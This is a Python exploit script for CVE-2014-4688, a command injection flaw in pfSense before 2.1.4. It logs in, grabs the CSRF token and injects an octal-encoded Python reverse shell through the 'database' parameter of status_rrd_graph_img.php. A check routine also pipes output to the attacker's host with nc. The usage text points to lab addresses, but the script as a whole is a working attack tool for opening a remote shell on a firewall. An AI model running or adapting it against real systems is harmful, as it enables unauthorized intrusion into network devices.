import argparse
import requests
import urllib3
import urllib
import collections
import sys
import lxml.html
from log_colors import *
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CVE-2014-4688
# pfSense before 2.1.4 allows 
# remote authenticated users 
# to execute arbitrary commands via
# (1) the hostname value to diag_dns.php in a Create Alias action,
# (2) the smartmonemail value to diag_smart.php, or 
# (3) the database value to status_rrd_graph_img.php.
class CVE2014_4688:

    def __init__(self, lhost, lport, rhost, usr, pswd):
        print (LogColors.BLUE + "victim: " + rhost + "..." + LogColors.ENDC)
        self.lhost, self.lport = lhost, lport
        self.rhost = rhost
        self.usr, self.pswd = usr, pswd
        self.session = requests.Session()
        self.login_url = "https://" + self.rhost + "/index.php"
        self.headers = {
            'User-Agent' : 'Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language' : 'en-US,en;q=0.5',
            'Referer' : self.login_url,
            'Connection' : 'close',
            'Upgrade-Insecrure-Requests' : '1',
            'Content-Type' : 'application/x-www-form-urlencoded',
        }

    # get csrf token
    def get_csrf_token(self):
        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
        try:
            r = self.session.get(self.login_url,
                headers = self.headers, verify = False, allow_redirects = False
            )
            if r.ok:
                csrf = self.parse_csrf(r.text)
        except Exception:
            print (LogColors.RED + "error parse csrf :(" + LogColors.ENDC)

    # parse csrf token from html page
    def parse_csrf(self, html):
        tree = lxml.html.fromstring(html)
        csrf = tree.xpath(".//form[@id='iform']//input[contains(@name, '__csrf_magic')]/@value")
        if csrf:
            self.csrf = csrf[0].split(";")[0]
        print (LogColors.YELLOW + "csrf: " + self.csrf + "..." + LogColors.ENDC)
        return self.csrf

    # login
    def login(self):
        self.get_csrf_token()
        print (LogColors.BLUE + "login..." + LogColors.ENDC)
        data = {
            "__csrf_magic" : self.csrf,
            "usernamefld" : self.usr,
            "passwordfld" : self.pswd,
            "login" : "Login",
        }
        r = self.session.post(
            self.login_url,
            data = data,
            verify = False,
        )
        if r.status_code == 200 and "Username" not in r.text:
            self.parse_csrf(r.text)
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
        else:
            if r.status_code == 404 and "CSRF" in r.text:
                print (LogColors.RED + "login failed. incorrect csrf..." + LogColors.ENDC)
            else:
                print (LogColors.RED + "error login..." + LogColors.ENDC)
            sys.exit()

    # generate payload
    def generate_payload(self):
        print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
        cmd = ""
        cmd += "python -c 'import socket,subprocess,os;"
        cmd += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        cmd += 's.connect(("' + self.lhost + '",' + self.lport + '));'
        cmd += 'os.dup2(s.fileno(),0);'
        cmd += 'os.dup2(s.fileno(),1);'
        cmd += 'os.dup2(s.fileno(),2);'
        cmd += 'p=subprocess.call(["/bin/sh","-i"]);'

        payload = ""
        for c in cmd:
            payload += ("\\" + oct(ord(c)).lstrip("0o"))

        payload = "\\12" + payload + "\\47\\12"
        return payload

    # check injection
    def check(self):
        check_url = "https://" + self.rhost + "/status_rrd_graph_img.php"
        check_url += "?database=queues;echo+'hello'+|nc+" + self.lhost + "+" + self.lport
        r = self.session.get(check_url, verify = False)
        if r.ok:
            print (LogColors.GREEN + "pfsense is vulnerable. hackable :)" + LogColors.ENDC)
            return True
        return False

    # exploit
    def run(self):
        self.login()
        #self.check()
        print (LogColors.BLUE + "running exploit..." + LogColors.ENDC)
        payload = self.generate_payload()
        exploit_url = "https://" + self.rhost + "/status_rrd_graph_img.php?"
        exploit_url += "database=queues;" + "printf+" + "'" + payload + "'|sh"

        exploit_url = "https://" + self.rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"
        print (LogColors.YELLOW + "exploit: " + exploit_url + LogColors.ENDC)
        try:
            r = self.session.get(exploit_url,
                headers = self.headers, timeout = 10, verify = False
            )
            if r.status_code:
                print (LogColors.RED + "failed running exploit :(" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.GREEN + "successfully exploited. hacked :)" + LogColors.ENDC)
            print (LogColors.GREEN + "check shell on " + self.lhost + ":" + self.lport + LogColors.ENDC)

if __name__ == '__main__':
    print (LogColors.GREEN + "Usage:" + LogColors.ENDC)
    print (LogColors.GREEN + "$>nc -nlvp 10.10.14.12 4444" + LogColors.ENDC)
    print (LogColors.GREEN + "$>python cve_2014_4688.py --lhost 10.10.6.17 --lport 4444 --target 10.10.10.50 --username pfsense --password pfsense" + LogColors.ENDC)
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target victim host/ip")
    parser.add_argument('-l','--lhost', required = True, help = "local listener host")
    parser.add_argument('-p', '--lport', required = True, help = "local listener port")
    parser.add_argument('-u', '--username', required = True, help = "pfsense username")
    parser.add_argument('-s', '--password', required = True, help = "pfsense password")
    args = vars(parser.parse_args())
    rhost = args['target']
    lhost, lport = args['lhost'], args['lport']
    usr, pswd = args['username'], args['password']
    cve = CVE2014_4688(lhost, lport, rhost, usr, pswd)
    cve.run()

